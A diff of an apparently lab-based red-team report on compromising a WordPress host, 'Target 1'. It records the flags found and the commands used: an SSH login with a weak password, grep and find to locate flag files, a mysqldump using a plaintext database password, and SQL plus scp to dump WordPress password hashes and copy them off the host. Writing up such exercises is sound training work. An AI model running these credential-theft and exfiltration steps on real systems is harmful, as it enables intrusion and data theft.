@@ -87,10 +87,10 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
          - The user michael had an obvious password "michael" on both his WordPress and Target1 accounts
          - Logged in as michael and used grep to find flag1 inside /var/www/html/service.html
             - `ssh michael@192.168.1.110`
+            ![Target1/logged_in_as_michael.JPG](Target1/logged_in_as_michael.JPG)
             - `cd /var/www/html`
             - `grep -r flag1 *`
             ![Target1/flag1_found.JPG](Target1/flag1_found.JPG)
-      
   - `/var/www/flag2.txt`: fc3fd58dcdad9ab23faca6e9a36e581c
     - **Exploit Used**
       - Exploited weak password (same exploit as in flag 1)
@@ -100,7 +100,6 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
       - `find . -name flag\* 2>/dev/null`
       - `cat /var/www/flag2.txt`            
       ![Target1/flag2_found.JPG](Target1/flag1_found.JPG)
-
   - `flag3 is in mySQL database`: afc01ab56b50591e7dcc93122770cd2
     - **Exploits Used**
       - Exploited weak password (same exploit as in flag 1)
@@ -114,3 +113,35 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
         `mysqldump -uroot -p"R@v3nSecurity" wordpress | grep --color flag`
         ![Target1/mysqldump_wordpress_command.JPG](Target1/mysqldump_wordpress_command.JPG)
         ![Target1/flags3_and_4_found.JPG](Target1/flags3_and_4_found.JPG)
+  - `/root/flag4.txt`: 
+    - **Exploits Used**
+      - Exploited weak password of michael (same exploit as in flag 1)
+      - Exploited poorly set file permissions on WordPress configuration file (same exploit as in flag 3)
+      - Brute force cracking of password of steven
+      - Priviledge escalation to root
+    - **Exploit Commands**
+       - Logged in as michael (same exploit used in flag 1, 2, and 3)
+       - Using the WordPress database credentials as in flag 3, found list of tables in the database:
+         `show tables`
+         ![Target1/wordpress_tables.JPG](wordpress_tables.JPG)
+       - Examined wp_users table schema and contents:
+         `describe wp_users`
+       - Examined relevant wp_users contents:  
+          `select user_login, user_pass from wp_users;`
+          ![Target1/wp_users_schema_and_contents.JPG](wp_users_schema_and_contents.JPG)
+       - Exfiltrated table contents:
+          ```
+          select user_login, user_pass from wp_users
+          INTO OUTFILE '/tmp/wp_users.csv'
+          FIELDS TERMINATED BY ','
+          ENCLOSED BY '"'
+          LINES TERMINATED BY '\n'
+          ;
+          quit
+          ```
+          ```
+          cat /tmp/wp_users.csv
+          exit
+          scp michael@192.168.1.110:/tmp/wp_users.csv .
+          ```
+          ![Target1/wp_users_exfiltration.JPG](wp_users_exfiltration.JPG)
